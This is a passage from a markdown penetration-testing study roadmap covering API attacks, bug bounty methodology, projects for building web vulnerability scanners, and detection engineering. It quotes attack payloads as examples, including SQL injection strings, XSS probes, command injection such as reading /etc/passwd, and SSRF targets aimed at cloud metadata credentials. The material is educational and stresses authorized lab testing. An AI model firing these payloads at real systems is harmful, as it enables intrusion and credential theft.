- [ ] **API3 — Broken Object Property Level Authorization (BOPLA):** Send **extra fields** in PUT/PATCH requests to modify properties the user shouldn't control (e.g., `"role":"admin"`, `"is_verified":true`).

- [ ] **API4 — Unrestricted Resource Consumption:** Test **missing rate limits, no pagination caps, large payload DoS, CPU-exhausting regex/query parameters**.

- [ ] **API5 — Broken Function Level Authorization (BFLA):** Access **admin-only endpoints** (`/api/admin/users`, `/api/internal/`) using **regular user tokens**; test HTTP method switching (GET → DELETE).

- [ ] **API6 — Unrestricted Access to Sensitive Business Flows:** Abuse **checkout flows, invite systems, voting, coupon redemption** without rate limiting or workflow enforcement.

- [ ] **API7 — Server-Side Request Forgery (SSRF):** Supply **internal URLs, cloud metadata endpoints** (`169.254.169.254`) as API parameters for internal network pivoting.

- [ ] **API8 — Security Misconfiguration:** Find **exposed debug endpoints, verbose errors, missing CORS restrictions, HTTP instead of HTTPS, default API keys**.

- [ ] **API9 — Improper Inventory Management:** Target **deprecated API versions, shadow APIs, staging/dev endpoints** still accessible in production.

- [ ] **API10 — Unsafe Consumption of APIs:** Exploit **third-party API data** that is trusted and processed without validation, causing **injection or SSRF** on the consuming server.

---

<a id="stage-3-protocol-specific-api-attacks"></a>
### **Topic 3: Protocol-Specific API Attacks** — `🔬 Practical`

> [!TIP]
> **Goal:** Attack REST, GraphQL, gRPC, and SOAP distinctly.

- [ ] **GraphQL Attacks & Schema Extraction:**
  - Execute **introspection queries** (`__schema`, `__type`) to recover the full type system, fields, queries, and mutations.
  - If introspection is disabled, use **field suggestion enumeration** (e.g., Clairvoyance) exploiting server error feedback ("Did you mean ...?").
  - Test for **batching & alias abuse** to bypass rate limits (sending hundreds of queries in a single HTTP request).
  - Abuse **nested circular queries** (e.g., `author { posts { author { posts { ... } } } }`) to trigger server CPU exhaustion and Denial of Service.
  - Exploit **Broken Object Level Authorization (BOLA)** on sensitive GraphQL mutations (updating user profile, assigning roles) where authorization checks are missing.

- [ ] **gRPC Security:** Use **grpcurl, Evans** to enumerate services; test for **missing auth interceptors, reflection enabled in prod, proto injection**.

- [ ] **SOAP/XML APIs:** Exploit **XXE via SOAP body**, test **WS-Security header bypass**, abuse **type confusion in XML parsing**.

---

<a id="stage-4-api-authentication-token-attacks"></a>
### **Topic 4: API Authentication & Token Attacks** — `🔬 Practical`

> [!TIP]
> **Goal:** Break API authentication mechanisms.

- [ ] **JWT Attacks:** Test **`alg:none` bypass, RS256→HS256 confusion, weak secret brute-force (hashcat mode 16500), kid injection, jku/x5u header injection** to forge arbitrary tokens.

- [ ] **OAuth 2.0 Attacks:** Exploit **CSRF on authorization endpoint, open redirect in redirect_uri, state parameter bypass, token leakage via Referer header**.

- [ ] **API Key Attacks:** Find **keys in JS bundles, git history, response headers, error messages**; test **key rotation absence, missing key scoping**.

- [ ] **mTLS Bypass:** Identify **endpoints that skip client certificate validation**, abuse **certificate pinning gaps**, exploit **proxy stripping of client certs**.

---

<a id="stage-5-defense-hardening"></a>
### **Topic 5: Defense & Hardening** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Know what defenders implement so you can test it properly.

- [ ] **API Gateway Controls:** Understand **rate limiting, quota enforcement, request validation, JWT verification, IP allowlisting** at the gateway layer.

- [ ] **Input Validation:** Test that **schema validation, type enforcement, max length, allowed values** are enforced server-side not just client-side.

- [ ] **Logging & Monitoring:** Verify **all API calls are logged** with enough context (user, IP, endpoint, response code) for anomaly detection.

---

<a id="lab-progression-part-19-api-security"></a>
### **Lab Progression (Part 19: API Security)**

| Level | Task | Deliverable |
|-------|------|-------------|
| 1 | Complete crAPI (completely ridiculous API) lab — all OWASP API Top 10 challenges | Challenge completion documentation |
| 2 | Test BOLA, broken auth, and mass assignment against vAPI or Juice Shop API | OWASP API assessment report |
| 3 | Exploit JWT algorithm confusion (`alg:none`, RS256→HS256) and forge tokens in a lab API | JWT attack PoC + writeup |
| 4 | Write automated API security tests using [Postman](Tools/Postman.md) collections or Burp macros | Test suite + results |
| 5 | Audit a GraphQL API (introspection dump, batching abuse, nested query DoS, IDOR via node IDs) | GraphQL security assessment report |

> [!IMPORTANT]
> **Move-On Gate:** You can discover undocumented API endpoints, test all OWASP API Top 10 categories, exploit JWT/OAuth flaws, attack REST/GraphQL/gRPC APIs, and produce a professional API security assessment report.

---

<a id="toc-part-20-bug-bounty-and-penetration-testing"></a>
<a id="part-20-bug-bounty-and-penetration-testing"></a>

---

<a id="module-18-bug-bounty-methodology"></a>
<a id="part-20-bug-bounty-methodology"></a>

## Module 18: Bug Bounty Methodology


> [!NOTE]
> **📚 Recommended Books for This Part**
> - 🔴 `zseano's methodology` — Full (short) — practical bug bounty workflow from an experienced hunter
> - 🔴 `From Hacking to Report Writing` — Full — bridges exploitation to professional report writing; read before Part 39
> - 🟡 `Bug Bounty Hunting For Web Security` — Full — platform-specific methodology for HackerOne, Bugcrowd etc.
> - 🟡 `Web security testing guide` — Reference — OWASP WSTG test case IDs for reporting (e.g. WSTG-INPV-05)
> - 🟢 `Web Application Pentest Methodology` — Reference — structured methodology doc to use during assessments


<a id="stage-1-preparation-scoping"></a>
### **Topic 1: Preparation & Scoping** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Stay legal and define the target.

- [ ] **Legal Check:** Read and sign the `Penetration Testing Rules of Engagement` or the Bug Bounty Policy (Safe Harbor).

- [ ] **Scope Validation:** Confirm IP ranges and domains. Ensure you are not attacking "Out of Scope" assets.

- [ ] **Framework Selection:** Decide which **testing methodology** governs the engagement:
  - **OWASP WSTG (Web Security Testing Guide)** — the methodology for *how to test* web applications; test cases are referenced by ID (e.g., WSTG-INPV-01 for SQL injection)
  - **NIST SP 800-115** — federal/regulated-industry methodology
  - **PTES** — comprehensive red team engagement framework

  > [!WARNING]
  > **Critical Distinction:** The **OWASP Top 10** is a *vulnerability classification list* used to categorize and report findings — it is NOT a testing methodology. Saying you "test against OWASP Top 10" is a common red flag in interviews and client engagements. You *test using OWASP WSTG* and *report findings mapped to OWASP Top 10 categories*. These are different documents serving different purposes.

---

<a id="stage-2-reconnaissance-the-wide-net"></a>
### **Topic 2: Reconnaissance (The Wide Net)** — `🔬 Practical`

> [!TIP]
> **Goal:** Find what others missed.

- [ ] **Subdomain Enumeration & Asset Discovery:**
  - Enumerate root domains, ASN blocks, and CIDRs using `amass`, `subfinder`, and `assetfinder`.
  - Use permutation and alteration engines (`altdns`, `dnsx`) to discover unlinked staging and development infrastructure.
  - Query Certificate Transparency logs (`crt.sh`) for newly minted wildcard certificates and shadow domains.

- [ ] **Port Scanning & Web Probing:**
  - Run high-speed probes via `naabu` / `masscan` and resolve live web services via `httpx` (`httpx -title -tech-detect -status-code`).
  - Run `nmap -sV -sC` against identified active ports to map out unusual web administrative interfaces.

- [ ] **JavaScript Source Code Analysis & Endpoint Extraction:**
  - Scrape and extract all internal endpoints, API keys, and routes from client-side JS bundles using `katana`, `LinkFinder`, or `gau` (GetAllUrls).
  - Use `jsbeautifier` to deobfuscate source maps and uncover hidden feature flags and test routes.

- [ ] **Hidden Parameter Discovery:**
  - Discover undocumented query parameters and request body attributes using `arjun` or `x8` to uncover hidden debug modes, bypass parameters, or administrative switches.

- [ ] **Tech Stack Analysis:** Use `curl` or browser extensions to identify the server, framework (React, Angular), and backend (PHP, Python).

---

<a id="stage-3-vulnerability-assessment-the-deep-dive"></a>
### **Topic 3: Vulnerability Assessment (The Deep Dive)** — `🔬 Practical`

> [!TIP]
> **Goal:** Find the flaw.

- [ ] **Input Fuzzing:** Test all input fields for `SQL Injection` (WSTG-INPV-05), `Cross-Site Scripting` (WSTG-CLNT-01), `Command Injection` (WSTG-INPV-12), `Server-Side Template Injection` (WSTG-INPV-18), `HTTP Parameter Pollution`, and `Mass Assignment` vulnerabilities.

  > [!NOTE]
  > **Do NOT test for Buffer Overflow in web application input fields.** Web applications run on managed-memory, interpreted runtimes (PHP, Python, Ruby, Node.js, Java). Buffer overflows are memory-corruption vulnerabilities in compiled binary applications — testing a PHP login form for buffer overflows is technically incorrect and will waste time. Buffer overflows belong in Phase 7 (Binary Exploitation). In web app testing, focus on injection and logic flaws.

- [ ] **Access Control:** Test for `IDOR` (Insecure Direct Object Reference) and verify `Authentication vs Authorization` logic.

- [ ] **Configuration Check:** Look for `Directory Traversal`, exposed `.git` folders, or default credentials (`admin/admin`).

---

<a id="stage-4-exploitation-validation"></a>
### **Topic 4: Exploitation & Validation** — `🔬 Practical`

> [!TIP]
> **Goal:** Prove the risk without breaking the system.

- [ ] **PoC Development:** Create a non-destructive Proof of Concept. (e.g., `alert(1)` for XSS, `whoami` for RCE).

- [ ] **False Positive Check:** Verify the finding is a `True Positive` before reporting.

- [ ] **Lateral Movement:** (Pentest only) Attempt `Privilege Escalation` or `Pass the Hash` if internal access is achieved.

---

<a id="stage-5-reporting-triage"></a>
### **Topic 5: Reporting & Triage** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Get paid and drive remediation.

- [ ] **Impact Assessment:** Clearly explain **business risk** (data breach, financial loss, compliance violation) to management.

- [ ] **Proof of Concept:** Provide **detailed steps, screenshots, videos, request/response** to reproduce the vulnerability.

- [ ] **Remediation Guidance:** Offer **specific technical fixes** (parameterized queries, input validation, patching) with code examples.

- [ ] **CVSS Scoring:** Calculate **CVSS score** to quantify severity and prioritize remediation.

---

<a id="stage-6-professional-development"></a>
### **Topic 6: Professional Development** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Build skills and reputation.

- [ ] **Platform Selection:** Focus on **HackerOne, Bugcrowd, Synack, Intigriti** platforms with active programs.

- [ ] **Specialization:** Develop expertise in **specific areas** (API security, mobile, cloud, blockchain).

- [ ] **Documentation:** Maintain **personal writeups, CVEs, Hall of Fame entries** for portfolio building.

- [ ] **Community Engagement:** Participate in **CTFs, conferences, Twitter/Discord security communities** for networking.

- [ ] **Continuous Learning:** Stay updated on **latest vulnerabilities, techniques, tools** through blogs, research papers, trainings.

---

### 🏆 Phase 4 Capstone Project

**Find and Document 5 Web Vulnerabilities Across Multiple Targets**

- [ ] **Identify 5 distinct vulnerability types** across 2+ targets (PortSwigger labs, DVWA, Juice Shop, or bug bounty programs)
- [ ] **Write a professional report** for each finding with CVSS scoring
- [ ] **Create PoC demonstrations** (non-destructive) for each vulnerability
- [ ] **Propose remediation** for each finding with code-level fixes where applicable

**Deliverables:**
- [ ] 5 vulnerability reports following responsible disclosure format
- [ ] PoC evidence (Burp exports, screenshots, curl commands)
- [ ] Remediation guide with before/after code examples
- [ ] All reports committed to your Git repository

> [!IMPORTANT]
> **Capstone Gate:** Your 5 reports must each contain reproducible steps, accurate CVSS scores, and actionable remediation guidance.

---

### 🧭 Phase 4 Reflection & Competency Check

- [ ] **Reflection:** Which vulnerability class was easiest to find but hardest to explain clearly?

- [ ] **Reflection:** Where did your first proof of concept need restraint to stay non-destructive?
- [ ] **Competency:** Can you map web and API findings to root cause, impact, and remediation?
- [ ] **Competency:** Can you reproduce each finding from a clean browser/session using only your report?
- [ ] **Competency:** Can you write reports that developers can fix without asking for missing steps?

> [!IMPORTANT]
> **Phase Completion Gate:** Move on only when your web findings are reproducible, responsibly scoped, accurately scored, and paired with concrete fixes.

---

<a id="toc-part-21-wireless-pentesting"></a>

---

<a id="phase-4-mini-projects"></a>

## 🛠️ Phase 4 Mini Projects

> [!TIP]
> **Why these projects are here:** Phase 4 covers web application hacking, web server exploitation, API security, and bug bounty methodology. All 9 projects below map directly to Parts 17–20 of this phase. They are not shortcuts — build each one *after* completing its corresponding Part, so you understand the vulnerability class before you write a tool to detect it.

> [!NOTE]
> **How to use this section:** Projects 15–22 are individual vulnerability checkers. Project 23 (Web Vulnerability Scanner) is the capstone — it integrates all the others into a single tool. Do not start Project 23 until all preceding projects are complete and working. All code must be committed to Git with proper READMEs that include: what vulnerability it targets, how it works, what it *cannot* detect, and ethical usage requirements.

---

### Project 15 — Website Security Header Checker

**Maps to:** Part 17 (Web Application Hacking) → Stage 1: Reconnaissance & Mapping + Stage 5: Defense & Mitigation

**What it is:** A tool that sends an HTTP(S) request to a target URL and analyzes the response headers for the presence and correctness of security headers: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-Opener-Policy`, and `Cross-Origin-Resource-Policy`. Grades each header (present/misconfigured/missing) and outputs an overall security score.

**What you need before building it:**
- HTTP request-response cycle: headers are sent by the server, parsed by the browser
- What each header does and what its *absence* enables:
  - Missing `CSP` → XSS can execute arbitrary scripts
  - Missing `HSTS` → SSL stripping attacks are possible
  - Missing `X-Frame-Options` or `CSP frame-ancestors` → clickjacking is possible
  - Missing `X-Content-Type-Options: nosniff` → MIME-sniffing attacks possible
- `requests` library (Python) for HTTP
- OWASP Secure Headers Project as your reference for correct values

**Why build it:**
Security headers are the first passive defense layer of any web application, and the majority of real-world sites fail basic header audits. Building this checker forces you to internalize what each header *prevents* — not just memorize their names. This knowledge transfers directly to code review, penetration testing, and secure development. It also gives you a tool that produces immediate, demonstrable value on any website — useful for bug bounty first steps.

**Deliverable:** Python CLI — `check <url>`. Output: table of headers, presence status, and what each missing header risks. Include an overall letter grade (A–F). README must explain what clickjacking is and which header prevents it.

---

### Project 16 — SSL/TLS Certificate Checker

**Maps to:** Part 17 (Web Application Hacking) → Stage 1: Reconnaissance & Mapping + Part 18 (Web Server Hacking) → Stage 2: Scanning & Service Enumeration

**What it is:** A tool that connects to a target hostname, retrieves the TLS certificate chain, and checks: certificate expiry date and validity window, hostname match (CN/SAN verification), certificate chain completeness, issuer and signature algorithm (flag SHA-1 signatures), TLS protocol version (flag TLS 1.0/1.1 and SSLv3), and cipher suite strength (flag export ciphers, RC4, DES).

**What you need before building it:**
- TLS handshake mechanics: ClientHello → ServerHello → Certificate → Key Exchange → Finished
- Certificate structure: Subject, Issuer, SAN (Subject Alternative Names), validity period, signature algorithm
- Python `ssl` module: `ssl.create_default_context()`, `ssl.SSLSocket.getpeercert()`
- `pyOpenSSL` for more detailed certificate chain inspection
- Know what `ssl.PROTOCOL_TLS_CLIENT` does vs constructing a context manually

**Why build it:**
Certificate misconfiguration is a frequent finding in professional audits and bug bounty programs. Expired certificates cause service outages. Weak cipher suites are exploitable. TLS 1.0/1.1 vulnerabilities (BEAST, POODLE) are well-documented. Building this tool means you understand TLS not just as "the green padlock" but as a protocol with version numbers, cipher negotiation, and a chain of trust that must be validated properly. This directly prepares you for understanding certificate-based authentication, MTLS, and PKI in Phase 6.

**Deliverable:** Python CLI — `check <hostname>`. Output: certificate details table with expiry, issuer, SAN list, protocol version, cipher suite, and flagged issues. README must explain what an expired certificate means for a production service and why SHA-1 signatures are deprecated.

---

### Project 17 — SQL Injection Detection Tool

**Maps to:** Part 17 (Web Application Hacking) → Stage 3: Exploitation (OWASP Top 10) — specifically A03:2021 Injection

**What it is:** An automated SQL injection tester for authorized web applications. Identifies injectable parameters (URL query strings, POST body fields), tests each parameter with error-based, boolean-based, and time-based payloads, analyzes responses for SQL error messages or behavioral anomalies, and generates a finding report with reproduction steps.

**What you need before building it:**
- SQL syntax basics: `SELECT`, `WHERE`, `UNION`, `--` (comment), `'` (string delimiter)
- The 3 main SQLi types:
  - **Error-based:** inject `'` → server returns a database error message containing SQL syntax
  - **Boolean-based blind:** inject `' AND 1=1--` (true) vs `' AND 1=2--` (false) → compare response differences
  - **Time-based blind:** inject `'; WAITFOR DELAY '0:0:5'--` (MSSQL) or `'; SELECT SLEEP(5)--` (MySQL) → measure response time
- HTTP parameter extraction with `BeautifulSoup` (parse HTML forms) and `requests`
- Database-specific error signatures: MySQL, PostgreSQL, MSSQL, SQLite each have distinct error strings

**Why build it:**
SQL injection has been in the OWASP Top 10 every year since its inception. It caused the Adobe breach (153M records), LinkedIn breach (117M), and hundreds of others. Building a detector forces you to think like an attacker — what does putting `'` in an input field actually do to a SQL query? What does a time delay reveal when there's no visible output? The understanding you gain here is what separates a developer who knows SQLi exists from one who can identify and fix it in production code.

**Deliverable:** Python CLI — `scan <url> --params auto`. Inject payloads into detected parameters, output findings as a structured report with: parameter name, injection type, payload used, evidence. README must include a lab setup section using DVWA or Juice Shop (never test on live sites without permission).

---

### Project 18 — XSS Scanner

**Maps to:** Part 17 (Web Application Hacking) → Stage 3: Exploitation (OWASP Top 10) — A03:2021 Injection (client-side)

**What it is:** A reflected XSS detection tool that: extracts injectable parameters from a target URL (query strings, form inputs), injects a set of XSS probe payloads, analyzes the HTML response to check if the payload appears unescaped in the output, and reports confirmed findings. Optionally uses a headless browser (Playwright) to detect DOM-based XSS.

**What you need before building it:**
- How browsers parse HTML and when script tags execute
- The 3 XSS types:
  - **Reflected:** payload in URL → reflected in immediate response → executes in victim's browser
  - **Stored:** payload saved to database → executes every time the page loads (not testable with this tool alone)
  - **DOM-based:** payload processed by client-side JavaScript — requires a headless browser to detect
- XSS payload variants: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `javascript:alert(1)`, attribute injection
- Why `<script>alert(1)</script>` doesn't always work: HTML encoding, Content-Security-Policy, modern browser mitigations
- `BeautifulSoup` for HTML response parsing

**Why build it:**
XSS enables session hijacking (steal `document.cookie`), credential phishing (inject fake login forms), defacement, and malware distribution. Detecting it requires understanding how browsers interpret HTML differently depending on context (HTML body vs attribute vs JavaScript string). Building this scanner forces you to internalize exactly why output encoding — not input filtering — is the correct defense. Every output in a web app has a context, and that context determines the correct encoding function.

**Deliverable:** Python CLI — `scan <url>`. Output: list of reflected parameters with payload evidence. README must explain the difference between reflected and stored XSS and why your tool can only detect reflected.

---

### Project 19 — Phishing URL Detector

**Maps to:** Part 10 (Social Engineering) → Stage 2: The Digital Assault (Remote Vectors) + Part 17 Stage 3: OWASP A09 Security Logging and Monitoring Failures

**What it is:** A URL analysis tool that scores a given URL's likelihood of being a phishing link based on: lexical features (URL length, number of dots, presence of IP address, suspicious keywords like `paypal-secure`, `login-verify`), homoglyph detection (lookalike characters: `рaypal.com` using Cyrillic `р`), domain age via WHOIS (newly registered domains are high risk), entropy of the subdomain, and reputation check via VirusTotal API and Google Safe Browsing API.

**What you need before building it:**
- URL structure: scheme, subdomain, domain, TLD, path, query, fragment — know what each part is
- Unicode homoglyphs: `а` (Cyrillic) looks identical to `a` (Latin) — phishers exploit this
- Levenshtein distance for typosquatting detection (e.g., `gooogle.com` vs `google.com`)
- WHOIS domain age: `python-whois` library
- VirusTotal API (free tier: 4 requests/minute) — requires an API key
- Google Safe Browsing API (free) — requires a Google Cloud API key
- Shannon entropy calculation for detecting algorithmically generated subdomains (DGA)

**Why build it:**
Phishing is the #1 initial access vector in real-world attacks — responsible for over 80% of reported security incidents according to Verizon DBIR. This is also where security meets machine learning: production phishing detectors at Google, Microsoft, and Cloudflare use ML models trained on millions of URLs. Building the feature-extraction and rule-based version teaches you what features matter and *why*, which is the foundation for building or evaluating ML-based versions later. It also gives you hands-on experience with real threat intelligence APIs.

**Deliverable:** Python CLI — `analyze <url>`. Output: feature breakdown table with scores, overall risk verdict (Likely Phishing / Suspicious / Likely Safe), and evidence. README must explain what a homoglyph attack is with a real example.

---

### Project 20 — Command Injection Detector

**Maps to:** Part 17 (Web Application Hacking) → Stage 3: Exploitation (OWASP Top 10) — A03:2021 Injection (OS command)

**What it is:** A tool that tests authorized web application endpoints for OS command injection by injecting shell metacharacters and command chaining operators into parameters, analyzing responses for command output or timing anomalies, and reporting confirmed injection points with payload evidence.

**What you need before building it:**
- Linux/Unix shell operators: `;` (sequential execution), `|` (pipe), `&&` (AND), `||` (OR), `` ` `` (backtick subshell), `$()` (subshell)
- Windows command chaining: `&`, `&&`, `|`, `||`, `%0A` (URL-encoded newline)
- Blind command injection: when there's no visible output, use time-based payloads (`; sleep 5`) or out-of-band (DNS/HTTP callback to a server you control)
- Why command injection happens: web apps that call `os.system()`, `subprocess.call()`, `exec()`, or shell=True with unsanitized user input
- Payloads: `; id`, `| whoami`, `&& cat /etc/passwd`, `$(id)`, backtick variants

**Why build it:**
Command injection is the highest-severity web vulnerability class — successful exploitation gives an attacker direct shell access to the server. Unlike SQLi (database) or XSS (browser), command injection compromises the entire operating system. Understanding how to detect it requires knowing how web applications interact with the underlying OS, why `shell=True` in Python's `subprocess` is dangerous, and what a WAF can and cannot block. This knowledge directly informs secure code review.

**Deliverable:** Python CLI — `scan <url> --params <param1,param2>`. Inject payloads, detect command output or timing anomalies, output findings. README must include a vulnerable test case setup using DVWA and explain why `shell=False` with explicit argument lists prevents injection.

---

### Project 21 — SSRF Detection Tool

**Maps to:** Part 17 (Web Application Hacking) → Stage 3: Exploitation (OWASP Top 10) — A10:2021 Server-Side Request Forgery

**What it is:** A tool that tests authorized web applications for Server-Side Request Forgery by submitting internal network addresses and cloud metadata endpoints as URL parameters, detecting whether the server fetches those URLs (via response content analysis or out-of-band callback), and reporting confirmed SSRF with potential impact analysis.

**What you need before building it:**
- What SSRF is: an attacker controls a URL that the *server* fetches — the server becomes a proxy for attacking internal resources
- Internal network targets: `http://127.0.0.1/`, `http://localhost/`, `http://169.254.169.254/` (AWS EC2 metadata), `http://192.168.x.x/`, `http://[::1]/`
- Cloud metadata endpoints:
  - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - GCP: `http://metadata.internal/computeMetadata/v1/`
  - Azure: `http://169.254.169.254/metadata/instance`
- Out-of-band detection: set up a webhook (Webhook.site, Interactsh, or self-hosted) and use your webhook URL as the payload — if the server calls your webhook, SSRF is confirmed
- URL parser bypass techniques: `http://evil.com@127.0.0.1/`, DNS rebinding concepts

**Why build it:**
SSRF became a critical vulnerability class with cloud adoption. The 2019 Capital One breach — 100 million records stolen — was executed via SSRF against the AWS EC2 metadata service to steal IAM credentials. Understanding SSRF requires understanding cloud architecture, internal service communication, and why "the server can reach internal services" is a dangerous design assumption. This project also introduces you to out-of-band detection, a technique used throughout professional penetration testing for blind vulnerabilities.

**Deliverable:** Python CLI — `scan <url> --param <url-parameter>`. Test with internal IP payloads and cloud metadata endpoints. Set up Interactsh for OOB detection. Output: confirmed SSRF findings with impact analysis. README must explain the Capital One breach at a high level and which SSRF mitigation (allowlist vs blocklist) is more reliable.

---

### Project 22 — Directory Brute-Force Tool

**Maps to:** Part 17 (Web Application Hacking) → Stage 1: Reconnaissance & Mapping — specifically content discovery

**What it is:** A web directory and file enumeration tool that sends HTTP requests for each entry in a wordlist, analyzes response codes and content lengths to identify valid paths, filters false positives (servers that return 200 for all requests), and reports discovered directories and files with their HTTP status and size.

**What you need before building it:**
- HTTP status codes: 200 (found), 301/302 (redirect — still interesting), 403 (forbidden — path exists, just restricted), 404 (not found), 500 (server error — may indicate the path processes something)
- False positive filtering: some servers return 200 for every path (catch-all) — detect this by comparing content-length variance across responses
- Wordlists: SecLists `Discovery/Web-Content/` — `common.txt` for quick sweeps, `raft-large-files.txt` for thorough enumeration
- Async HTTP (`asyncio` + `aiohttp`) — sending 10,000 requests sequentially is unusably slow; concurrent async requests make it practical
- Rate limiting and backoff: don't DoS the target or trigger WAF rate limits

**Why build it:**
Exposed `.git` directories (leaking full source code), `/admin` panels, `/backup.zip` files, `/phpMyAdmin`, and `/wp-login.php` endpoints are found through directory brute-forcing. These are consistently among the most impactful bug bounty findings and real breach vectors. Building the tool teaches you *why* wordlist composition matters (what paths to test), how HTTP response analysis distinguishes existing paths from non-existent ones, and why false-positive filtering is non-trivial. It combines Phase 3 recon techniques with Phase 4 HTTP knowledge.

**Deliverable:** Python CLI — `scan <url> --wordlist <path> --threads <n> --extensions php,html,txt`. Output: table of discovered paths with status codes and content lengths, false-positive-filtered. README must explain what finding an exposed `.git` directory means for a target's security.

---

### Project 23 — Web Vulnerability Scanner (Capstone)

**Maps to:** Part 20 (Bug Bounty & Penetration Testing) → Stage 3: Vulnerability Assessment (The Deep Dive) — entire Phase 4 capstone

**What it is:** An automated web security assessment tool that orchestrates all preceding Phase 4 projects as modules in a single unified workflow. Given a target URL and authorization, it: runs security header checks (Project 15), TLS certificate inspection (Project 16), SQL injection testing (Project 17), XSS scanning (Project 18), command injection testing (Project 20), SSRF testing (Project 21), and directory brute-forcing (Project 22) — then aggregates all findings into a single structured report with severity ratings, reproduction steps, and remediation guidance.

**What you need before building it:**
- All Projects 15–22 must be complete and working as standalone tools
- Plugin/module architecture: each project becomes an importable module with a consistent interface — `run(target, options) → [Finding]`
- Unified finding schema: `{module, severity, title, url, parameter, payload, evidence, remediation}`
- Severity scoring: Critical / High / Medium / Low / Info — apply CVSS-inspired logic
- Async orchestration: run all modules concurrently (not sequentially) to reduce total scan time
- HTML report generation: use `jinja2` templates to produce a clean, shareable HTML report
- Scope enforcement: the tool must accept a scope definition and refuse to scan out-of-scope targets

**Why build it:**
This is the project you show to employers. It doesn't introduce new vulnerability concepts — it demonstrates you can *architect systems*, think about software design (plugin interfaces, unified schemas, concurrent execution), and deliver a professional output (structured report). Recruiters and interviewers don't just see a web scanner — they see evidence that you can integrate multiple domains of knowledge into a cohesive product. A polished version of this with a sample report is your Phase 4 portfolio centerpiece.

It also teaches a critical professional lesson: automated scanners miss things. Your README must document what this scanner *cannot* detect (stored XSS, CSRF, business logic flaws, authentication bypass, insecure direct object references) and why manual testing is still required. That intellectual honesty is what makes a security engineer trustworthy.

**Deliverable:**
- Python package with a CLI entry point: `webscan <url> --scope <domain> --output <report.html>`
- Each vulnerability module importable independently
- HTML report with: executive summary, finding table sorted by severity, per-finding detail pages with PoC steps and remediation
- README with: architecture diagram showing module integration, limitations section, ethical usage requirements, and sample report screenshot

---

> [!IMPORTANT]
> **Phase 4 Project Completion Gate:** Project 23 (the capstone) must produce a report that a security professional could read and act on without asking follow-up questions. If your findings lack reproduction steps, payload evidence, or remediation guidance — the project is not done. Polish the report before moving to Phase 5.

---

<a id="side-track"></a>

## 🛡️ Parallel Side-Track: Defensive Awareness & Threat Intelligence
*(Absorb only — run in parallel during Stage 3 lab downtime. Never block the offensive critical path.)*

---

<a id="side-track-a-detection-engineering--soc-operations"></a>
<a id="part-13a-detection-engineering-soc-operations"></a>

### Side-Track A: Detection Engineering & SOC Operations


_Understand defensive detection to know what to evade. This Part covers core detection engineering, SIEM, threat hunting, incident response, and forensic fundamentals (Stages 1–10). Security operations expansion topics (SOAR, DLP, Vulnerability Management, Insider Threat) continue in Part 13B._

<a id="stage-1-defensive-architecture"></a>
### **Topic 1: Defensive Architecture** — `🧠 Conceptual`

- [ ] **Defense-In-Depth:** Layer **EDR, SIEM, CASB, firewall, WAF, IDS/IPS, DNS filtering** with **proper tuning** to reduce false positives and enable hunting.

- [ ] **Threat Hunting:** Proactively search for **suspicious patterns** (parent/child process anomalies, unsigned DLLs, scheduled task abuse, registry modifications) using **Sigma rules, YARA, KQL**.

- [ ] **Incident Response Plan:** Document **detection, containment, eradication, recovery, lessons learned** phases with **clear ownership and escalation paths**.

---

<a id="stage-2-offensive-indicators-ttps"></a>
### **Topic 2: Offensive Indicators & TTPs** — `🧠 Conceptual`

- [ ] **IOC Identification:** Recognize **file hashes, domains, IPs, email patterns, behavioral signatures** that map to known attack frameworks (Cobalt Strike, [Metasploit](Tools/Metasploit_Framework.md), custom).

- [ ] **MITRE ATT&CK Mapping:** Correlate **detected behaviors** to **tactics/techniques** to understand adversary intent and prioritize detection investment.

- [ ] **Artifact Analysis:** Understand forensic artifacts (prefetch, MFT, journal logs, browser history, registry hives, event logs) as **evidence of compromise**.

---

<a id="stage-3-evasion-detection-hardening"></a>
### **Topic 3: Evasion Detection & Hardening** — `🔬 Practical`

- [ ] **Living-off-the-Land Detection:** Monitor **native binary execution** (PowerShell, WMI, certutil, mshta, bitsadmin) with **process whitelisting, memory pattern analysis, and behavioral indicators**.

- [ ] **Obfuscation Analysis:** Detect **encoded payloads, packed executables, script obfuscation** via **entropy analysis, dynamic detonation, behavioral sandboxing**.

- [ ] **Anti-Forensics Detection:** Identify **log clearing, file timestomping, registry deletion, bash history removal** via **SIEM correlation and immutable audit logs**.

- [ ] **Command-Line Auditing:** Enable and monitor **PowerShell transcript logging, command-line audit logs (4688), script block logging** for obfuscated execution.

---

<a id="stage-4-detection-engineering-response"></a>
### **Topic 4: Detection Engineering & Response** — `🔬 Practical`

- [ ] **Detection Rules:** Write **Sigma, Snort/Suricata, Yara, osquery** rules targeting **adversary TTPs** from reconnaissance to exfiltration.

- [ ] **Alert Tuning:** Baseline **normal traffic/processes**, establish **alert thresholds**, reduce **false positives** to improve SOC efficiency.

- [ ] **SOC Playbooks:** Document **runbooks** for each alert type: **triage → validation → containment → remediation → documentation**.

- [ ] **Threat Intelligence Integration:** Consume **OSINT feeds, MISP, AlienVault OTX, commercial threat intel** to enrich **IP/domain/file lookups** in SIEM.

> [!IMPORTANT]
> **Stage Gate — Stages 1–4 (Detection Engineering):** Before proceeding to Stage 5, you must demonstrate:
> - [ ] Written at least 1 working Sigma rule that fires on a specific MITRE ATT&CK technique in a live SIEM
> - [ ] Identified 3 LOLBin execution patterns (e.g., certutil download, mshta execution, bitsadmin transfer) and named the event log source for each
> - [ ] Documented what anti-forensics evidence looks like in a Windows Event Log (e.g., event 1102 log cleared, event 4719 audit policy changed)
> - [ ] Explained the difference between signature-based detection and behavioral detection with a concrete example of a technique each approach would and would not catch

---

<a id="stage-5-edrxdrmdr-basics"></a>
### **Topic 5: EDR/XDR/MDR Basics** — `🧠 Conceptual`

> [!TIP]
> **Goal:** Understand modern endpoint and extended detection capabilities.

- [ ] **EDR Architecture:** Understand **agent-based detection (process, file, registry, network), telemetry collection, cloud backend, response orchestration**.

- [ ] **EDR Capabilities:** Know **behavioral analysis, memory scanning, AMSI integration, ETW collection, indicator of compromise (IOC) matching**.

